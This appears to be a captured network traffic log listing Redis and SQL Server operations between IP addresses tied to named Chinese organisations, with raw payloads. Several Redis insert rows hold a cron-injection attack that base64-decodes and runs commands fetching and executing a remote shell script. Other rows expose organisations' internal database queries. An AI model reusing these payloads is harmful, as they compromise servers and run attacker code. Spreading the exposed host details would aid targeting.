10050002125,redis更新操作,211.197.30.57,6379,"","","","",60.220.217.134,47044,山西省,长治市,武乡县,武乡中学校,2023-10-26T20:45:14.000+08:00,payload=10$6rename:3*1+write:1:2:1*3+@keyspace+@write+@slow*0*2*6$5flags*3+RW+access+delete$12begin_search*4$4type$5index$4spec*2$5index:1$9find_keys*4$4type$5range$4spec*6$7lastkey:0$7keystep:1$5limit:0*6$5flags*2+OW+update$12begin_search*4$4type$5index$4spec*2$5index:2$9find_keys*4$4type$5range$4spec*6$7lastkey:0$7keystep:1$5limit:0*0*10$7monitor:1*4+admin+noscript+loading+stale:0:0:0*3+@admin+@slow+@dangerous*0*0*0*10$6lolwut:-1*2+readonly+fast:0:0:0*2+@read+@fast*0*0*0*10$4incr:2*3+write+denyoom+fast:1:1:1*3+@write+@string+@fast*0*1*6$5flags*3+RW+access+update$12begin_search*4$4type$5index$4spec*2$5index:1$9find_keys*4$4type$5range$4spec*6$7lastkey:0$7keystep:1$5limit:0*0*10$14restore-asking:-4*3+write+denyoom+asking:1:1:1*4+@keyspace+@write+@slow+@dangerous*0*1*6$5flags*2+OW+update$12begin_search*4$4type$5index$4spec*2$5\0D
10050002124,redis插入操作,188.166.14.121,42878,"","","","",61.174.171.61,6379,浙江省,宁波市,余姚市,宁波市智能制造产业研究院,2023-10-26T15:01:19.000+08:00,*3$3set$7backup1$91\0A\0A\0A*/2 * * * * echo Y2QxIGh0dHA6Ly9zLm5hLWNzLmNvbS9iMmY2MjgvYi5zaAo=|base64 -d|bash|bash \0A\0A
10050002124,redis插入操作,43.154.25.244,42864,"","","","",101.206.211.85,6379,四川省,成都市,双流区,北川羌族自治县文化广播电视和旅游局,2023-10-26T05:48:17.000+08:00,*3$3set$7backup1$91\0A\0A\0A*/2 * * * * echo Y2QxIGh0dHA6Ly9zLm5hLWNzLmNvbS9iMmY2MjgvYi5zaAo=|base64 -d|bash|bash \0A\0A
10050002124,redis插入操作,43.154.25.244,56606,"","","","",110.249.174.38,6379,河北省,石家庄市,长安区,河北省科学技术厅,2023-10-26T03:53:32.000+08:00,*3$3set$7backup2$102\0A\0A\0A*/3 * * * * echo d2dldCAtcSAtTy0gaHR0cDovL3MubmEtY3MuY29tL2IyZjYyOC9iLnNoCg==|base64 -d|bash|bash\0A\0A
10050002124,redis插入操作,43.154.25.244,56606,"","","","",110.249.174.38,6379,河北省,石家庄市,长安区,河北省科学技术厅,2023-10-26T03:53:32.000+08:00,*3$3set$7backup1$96\0A\0A\0A*/2 * * * * root echo Y2QxIGh0dHA6Ly9zLm5hLWNzLmNvbS9iMmY2MjgvYi5zaAo=|base64 -d|bash|bash \0A\0A
10050002124,redis插入操作,43.154.25.244,56606,"","","","",110.249.174.38,6379,河北省,石家庄市,长安区,河北省科学技术厅,2023-10-26T03:53:32.000+08:00,"*3$3set$7backup4$123\0A\0A\0A@hourly  python -c ""import urllib2; print urllib2.urlopen('http://\\\\s.n\\a-c\\s.c\\om/t.sh').read()"" >.1;chmod +x .1;./.1\0A\0A"
10050002124,redis插入操作,43.154.25.244,56606,"","","","",110.249.174.38,6379,河北省,石家庄市,长安区,河北省科学技术厅,2023-10-26T03:53:31.000+08:00,*3$3set$7backup1$91\0A\0A\0A*/2 * * * * echo Y2QxIGh0dHA6Ly9zLm5hLWNzLmNvbS9iMmY2MjgvYi5zaAo=|base64 -d|bash|bash \0A\0A
10050002124,redis插入操作,43.154.25.244,56606,"","","","",110.249.174.38,6379,河北省,石家庄市,长安区,河北省科学技术厅,2023-10-26T03:53:32.000+08:00,*3$3set$7backup3$90\0A\0A\0A*/4 * * * * echo Y3VybCBodHRwOi8vcy5uYS1jcy5jb20vYjJmNjI4L2Iuc2gK|base64 -d|bash|bash\0A\0A
10050002124,redis插入操作,43.154.25.244,56606,"","","","",110.249.174.38,6379,河北省,石家庄市,长安区,河北省科学技术厅,2023-10-26T03:53:32.000+08:00,"*3$3set$7backup4$123\0A\0A\0A@hourly  python -c ""import urllib2; print urllib2.urlopen('http://\\\\s.n\\a-c\\s.c\\om/t.sh').read()"" >.1;chmod +x .1;./.1\0A\0A"
10050002124,redis插入操作,43.154.25.244,56606,"","","","",110.249.174.38,6379,河北省,石家庄市,长安区,河北省科学技术厅,2023-10-26T03:53:32.000+08:00,*3$3set$7backup3$95\0A\0A\0A*/4 * * * * root echo Y3VybCBodHRwOi8vcy5uYS1jcy5jb20vYjJmNjI4L2Iuc2gK|base64 -d|bash|bash\0A\0A
10050002124,redis插入操作,43.154.25.244,56606,"","","","",110.249.174.38,6379,河北省,石家庄市,长安区,河北省科学技术厅,2023-10-26T03:53:32.000+08:00,*3$3set$7backup2$107\0A\0A\0A*/3 * * * * root echo d2dldCAtcSAtTy0gaHR0cDovL3MubmEtY3MuY29tL2IyZjYyOC9iLnNoCg==|base64 -d|bash|bash\0A\0A
10050002126,redis查询操作,34.143.131.191,6379,"","","","",60.220.217.134,48722,山西省,长治市,武乡县,武乡中学校,2023-10-26T00:59:49.000+08:00,*7$3get:2*2+readonly+fast:1:1:1*3+@read+@string+@fast*7$6dbsize:1*2+readonly+fast:0:0:0*3+@keyspace+@read+@fast*7$14geosearchstore:-8*2+write+denyoom:1:2:1*3+@write+@geo+@slow*7$8setrange:4*2+write+denyoom:1:1:1*3+@write+@string+@slow*7$5psync:-3*2+admin+noscript:0:0:0*3+@admin+@slow+@dangerous*7$7publish:3*5+pubsub+loading+stale+fast+may_replicate:0:0:0*2+@pubsub+@fast*7$6lrange:4*1+readonly:1:1:1*3+@read+@list+@slow*7$4lrem:4*1+write:1:1:1*3+@write+@list+@slow*7$7zincrby:4*3+write+denyoom+fast:1:1:1*3+@write+@sortedset+@fast*7$11incrbyfloat:3*3+write+denyoom+fast:1:1:1*3+@write+@string+@fast
10050002126,redis查询操作,150.109.100.157,57368,"","","","",166.111.112.89,23756,北京市,北京市,海淀区,清华大学,2023-10-26T14:25:13.000+08:00,*2$3GET$44MXU:5e6d7c89902414568de4296f8710d8a5d570d237
10050002126,redis查询操作,150.109.100.157,57630,"","","","",166.111.112.89,23756,北京市,北京市,海淀区,清华大学,2023-10-26T14:25:27.000+08:00,*2$3GET$44MXU:5e6d7c89902414568de4296f8710d8a5d570d237
10050002126,redis查询操作,150.109.100.157,40775,"","","","",166.111.112.89,23756,北京市,北京市,海淀区,清华大学,2023-10-26T14:25:01.000+08:00,*2$3GET$44MXU:5e6d7c89902414568de4296f8710d8a5d570d237
10050002126,redis查询操作,150.109.100.157,57378,"","","","",166.111.112.89,23756,北京市,北京市,海淀区,清华大学,2023-10-26T14:25:13.000+08:00,*2$3GET$44MXU:5e6d7c89902414568de4296f8710d8a5d570d237
10050002126,redis查询操作,150.109.100.157,20002,"","","","",166.111.112.89,23756,北京市,北京市,海淀区,清华大学,2023-10-26T22:58:50.000+08:00,*2$3GET$44MXU:ae2707d3f60d91c50f9a12c1b09b0db8ada165ad
10050002126,redis查询操作,150.109.100.157,47897,"","","","",166.111.112.89,23756,北京市,北京市,海淀区,清华大学,2023-10-26T15:18:29.000+08:00,*2$3GET$27extend-field:fields:article
10050002126,redis查询操作,150.109.100.157,52295,"","","","",166.111.112.89,23756,北京市,北京市,海淀区,清华大学,2023-10-26T16:29:37.000+08:00,*2$3GET$34extend-field:fields:publish_column
10050002126,redis查询操作,150.109.100.157,47911,"","","","",166.111.112.89,23756,北京市,北京市,海淀区,清华大学,2023-10-26T15:18:31.000+08:00,*2$3GET$34extend-field:fields:publish_column
10050002126,redis查询操作,150.109.100.157,47911,"","","","",166.111.112.89,23756,北京市,北京市,海淀区,清华大学,2023-10-26T15:18:31.000+08:00,*2$3GET$34extend-field:fields:publish_column
10050002043,sqlserver查询操作,41.74.57.222,29704,"","","","",58.62.223.210,1433,广东省,广州市,白云区,广州市天河区逍遥网络服务经营部,2023-10-26T19:55:14.000+08:00,"\01\01\E0\01\16\12\02\01select datasource, srvid from master..sysservers where upper(srvname) = upper(N'IZJ6FUBS9PLYUOZ')"
10050002043,sqlserver查询操作,41.74.48.99,21410,"","","","",58.62.223.210,1433,广东省,广州市,白云区,广州市天河区逍遥网络服务经营部,2023-10-26T17:35:12.000+08:00,"\01\01\E0\01\16\12\02\01select datasource, srvid from master..sysservers where upper(srvname) = upper(N'IZJ6FUBS9PLYUOZ')"
10050002043,sqlserver查询操作,41.74.48.99,8321,"","","","",58.62.223.210,1433,广东省,广州市,白云区,广州市天河区逍遥网络服务经营部,2023-10-26T19:20:09.000+08:00,"\01\01\E0\01\16\12\02\01select datasource, srvid from master..sysservers where upper(srvname) = upper(N'IZJ6FUBS9PLYUOZ')"
10050002043,sqlserver查询操作,41.74.49.101,18586,"","","","",58.62.223.210,1433,广东省,广州市,白云区,广州市天河区逍遥网络服务经营部,2023-10-26T18:55:12.000+08:00,"\01\01\E0\01\16\12\02\01select datasource, srvid from master..sysservers where upper(srvname) = upper(N'IZJ6FUBS9PLYUOZ')"
10050002043,sqlserver查询操作,41.74.48.98,6206,"","","","",58.62.223.210,1433,广东省,广州市,白云区,广州市天河区逍遥网络服务经营部,2023-10-26T19:30:13.000+08:00,"\01\01\E0\01\16\12\02\01select datasource, srvid from master..sysservers where upper(srvname) = upper(N'IZJ6FUBS9PLYUOZ')"
10050002043,sqlserver查询操作,41.74.57.206,17631,"","","","",58.62.223.210,1433,广东省,广州市,白云区,广州市天河区逍遥网络服务经营部,2023-10-26T17:15:14.000+08:00,"\01\01\E0\01\16\12\02\01select datasource, srvid from master..sysservers where upper(srvname) = upper(N'IZJ6FUBS9PLYUOZ')"
10050002043,sqlserver查询操作,41.216.78.238,50971,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T21:10:16.000+08:00,\01\09\B4\01\16\12\02\01select * from stockvoucherdetail where locationlogo=-1 and officelogo='213'
10050002043,sqlserver查询操作,41.216.78.238,50971,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T21:18:32.000+08:00,"\01\09\01\A8\01\16\12\02\01select top 1 vouchlogo from jgyj j,stockvouch v,stockvoucherdetail d,ware w where j.vouchdlogo=d.vouchdlogo and j.vouchid=v.vouchid and j.warelogo=w.warelogo and j.officelogo='213' and  j.str2='0' "
10050002043,sqlserver查询操作,41.216.78.238,50971,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T21:12:43.000+08:00,\01\09\01\B6\01\16\12\02\01select * from stockvouch s1 where (dealinglogo='213' and state in (8) and (select vouchid from stockvouch s2 where s1.vouchid=s2.vouchold) is null) or (state=2 and vouchtypeid='0204' and officelogo='213')
10050002043,sqlserver查询操作,41.216.78.238,50971,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T21:06:55.000+08:00,\01\09\8E\01\16\12\02\01select * from freebutton where fbtype=1 and userlogo=745
10050002042,sqlserver插入操作,157.34.122.51,50136,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T11:27:41.000+08:00,"\01\01\01\D4\01\16\12\02\01C\01insert into stockvouch (officelogo,officename,vouchtypeid,[year],[month],[vouchnum],[VouchId],[VouchDate],[realtime],state) values ('211','pS\A6^\F4]\C9baS\B7_y\98\EEv\E8\90','0101','2023','9','001','CR038623100100001','2023-10-01',getdate(),0)"
10050002042,sqlserver插入操作,45.215.255.254,12727,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T03:04:26.000+08:00,"\01\01\01\06\01\16\12\02\07C\01insert into stockvoucherdetailzf select  *,getdate(),'\B3\\O\9E'  from stockvoucherdetail where vouchid='BC038823090700004'"
10050002042,sqlserver插入操作,45.215.255.254,10685,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T03:00:00.000+08:00,"\01\01\01\D6\01\16\12\02\039\01insert into stockvouch (officelogo,officename,vouchtypeid,[year],[month],[vouchnum],[VouchId],[VouchDate],[realtime],state) values ('213','^\8D\D4k\9ANFz\F4~\D6v\C9by\98\EEv\E8\90','0201','2023','8','001','BC038823100100001','2023-10-01',getdate(),0)"
10050002042,sqlserver插入操作,45.215.255.254,10685,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T03:12:58.000+08:00,"\01\01\01\D6\01\16\12\02\109\01insert into stockvouch (officelogo,officename,vouchtypeid,[year],[month],[vouchnum],[VouchId],[VouchDate],[realtime],state) values ('213','^\8D\D4k\9ANFz\F4~\D6v\C9by\98\EEv\E8\90','0101','2023','9','001','CR038823100100001','2023-09-30',getdate(),0)"
10050002042,sqlserver插入操作,45.215.255.254,12727,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T03:06:13.000+08:00,"\01\01\01\06\01\16\12\02\09C\01insert into stockvoucherdetailzf select  *,getdate(),'\B3\\O\9E'  from stockvoucherdetail where vouchid='BC038823090700005'"
10050002042,sqlserver插入操作,45.215.255.254,12727,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T03:02:32.000+08:00,"\01\01\E6\01\16\12\02\05C\01insert into stockvouchzf select  *,getdate(),'\B3\\O\9E'  from stockvouch where vouchid='BC038823090700003'"
10050002042,sqlserver插入操作,45.215.255.254,32312,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T02:59:56.000+08:00,"\01\01\01\06\01\16\12\02\043\01insert into stockvoucherdetailzf select  *,getdate(),'\B3\\O\9E'  from stockvoucherdetail where vouchid='BC038823090700001'"
10050002042,sqlserver插入操作,45.215.255.254,12727,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T03:06:12.000+08:00,"\01\01\E6\01\16\12\02\09C\01insert into stockvouchzf select  *,getdate(),'\B3\\O\9E'  from stockvouch where vouchid='BC038823090700005'"
10050002042,sqlserver插入操作,45.215.255.254,12727,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T03:02:32.000+08:00,"\01\01\01\06\01\16\12\02\05C\01insert into stockvoucherdetailzf select  *,getdate(),'\B3\\O\9E'  from stockvoucherdetail where vouchid='BC038823090700003'"
10050002042,sqlserver插入操作,45.215.255.254,10685,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T03:02:37.000+08:00,"\01\01\01\D6\01\16\12\02\059\01insert into stockvouch (officelogo,officename,vouchtypeid,[year],[month],[vouchnum],[VouchId],[VouchDate],[realtime],state) values ('213','^\8D\D4k\9ANFz\F4~\D6v\C9by\98\EEv\E8\90','0201','2023','8','001','BC038823100100001','2023-10-01',getdate(),0)"
10050002040,sqlserver删除操作,45.215.255.254,12727,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T03:04:26.000+08:00,\01\01\90\01\16\12\02\07C\01delete  from stockvouch where vouchid='BC038823090700004'
10050002040,sqlserver删除操作,45.215.255.254,12727,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T03:06:14.000+08:00,\01\01\A0\01\16\12\02\09C\01delete  from stockvoucherdetail where vouchid='BC038823090700005'
10050002040,sqlserver删除操作,45.215.255.254,12727,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T03:06:13.000+08:00,\01\01\90\01\16\12\02\09C\01delete  from stockvouch where vouchid='BC038823090700005'
10050002040,sqlserver删除操作,45.215.255.254,10685,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T03:10:42.000+08:00,\01\01\90\01\16\12\02\0D9\01delete from stockVouch where officelogo='213' and state=0
10050002040,sqlserver删除操作,45.215.255.254,12727,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T02:57:48.000+08:00,\01\01\90\01\16\12\02\02C\01delete  from stockvouch where vouchid='BC038823090700002'
10050002040,sqlserver删除操作,45.215.255.254,12727,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T03:02:33.000+08:00,\01\01\A0\01\16\12\02\05C\01delete  from stockvoucherdetail where vouchid='BC038823090700003'
10050002040,sqlserver删除操作,45.215.255.254,32312,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T02:59:56.000+08:00,\01\01\A0\01\16\12\02\043\01delete  from stockvoucherdetail where vouchid='BC038823090700001'
10050002040,sqlserver删除操作,45.215.255.254,32312,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T02:59:56.000+08:00,\01\01\90\01\16\12\02\043\01delete  from stockvouch where vouchid='BC038823090700001'
10050002040,sqlserver删除操作,45.215.255.254,12727,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T03:02:33.000+08:00,\01\01\90\01\16\12\02\05C\01delete  from stockvouch where vouchid='BC038823090700003'
10050002040,sqlserver删除操作,45.215.255.254,12727,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T03:06:14.000+08:00,\01\01\90\01\16\12\02\09C\01delete  from stockvouch where vouchid='BC038823090700005'
10050002041,sqlserver更新操作,157.34.122.51,50136,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T11:28:00.000+08:00,\01\01\01\02\01\16\12\02\02C\01update stockvouch set endstate=1 where vouchid=(select vouchold from stockvouch where vouchid='CR038623100100001')
10050002041,sqlserver更新操作,45.215.255.254,10685,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T03:10:58.000+08:00,\01\01\92\01\16\12\02\0F9\01Update Functionstate set costcalc=0 where officelogo='213'
10050002041,sqlserver更新操作,45.215.255.254,12727,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T03:02:31.000+08:00,\01\01\E4\01\16\12\02\05C\01update stockvouch set state=1 where VouchId='BC038823090700003' and (state=1 or state=0 or state=2)
10050002041,sqlserver更新操作,45.215.255.254,12727,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T03:03:05.000+08:00,\01\01\B4\01\16\12\02\06C\01update stockvouch set state=9 where VouchId='BC038823090700004' and state=9
10050002041,sqlserver更新操作,45.215.255.254,12727,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T03:04:25.000+08:00,\01\01\E4\01\16\12\02\07C\01update stockvouch set state=1 where VouchId='BC038823090700004' and (state=1 or state=0 or state=2)
10050002041,sqlserver更新操作,45.215.255.254,32312,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T02:59:37.000+08:00,\01\01\B2\01\16\12\02\033\01update stockvoucherdetail set arealogo=0 where vouchid='BC038823090700001'
10050002041,sqlserver更新操作,45.215.255.254,12727,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T03:06:05.000+08:00,\01\01\9E\01\16\12\02\08C\01update stockvouch set state=1 where vouchid= 'BC038823090700005'
10050002041,sqlserver更新操作,45.215.255.254,12727,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T03:03:09.000+08:00,\01\01\9E\01\16\12\02\06C\01update stockvouch set state=1 where vouchid= 'BC038823090700004'
10050002041,sqlserver更新操作,45.215.255.254,32312,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T02:59:40.000+08:00,\01\01\9E\01\16\12\02\033\01update stockvouch set state=1 where vouchid= 'BC038823090700001'
10050002041,sqlserver更新操作,45.215.255.254,12727,"","","","",36.32.120.114,8499,安徽省,宿州市,埇桥区,中煤第七十一工程处有限责任公司,2023-10-26T02:57:36.000+08:00,\01\01\B2\01\16\12\02\01C\01update stockvoucherdetail set arealogo=0 where vouchid='BC038823090700002'
